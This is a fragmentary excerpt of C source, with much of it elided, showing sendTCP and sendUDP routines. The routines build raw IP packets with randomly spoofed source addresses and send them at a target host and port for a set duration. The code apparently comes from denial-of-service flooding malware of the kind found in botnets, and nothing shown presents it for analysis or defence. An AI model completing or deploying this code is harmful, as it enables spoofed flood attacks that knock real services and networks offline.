 ...
 void sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
        ...
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct my_tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct my_tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
 
        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct my_tcphdr) + packetsize);
	...
	tcph->urg_ptr = 0;
        ...
        int packet_len = sizeof(struct iphdr) + sizeof(struct my_tcphdr) + packetsize;
...
void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
        ...
        if(spoofit == 32)
        {
                ...
                makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct my_udphdr) + packetsize);
 
                udph->len = htons(sizeof(struct my_udphdr) + packetsize);
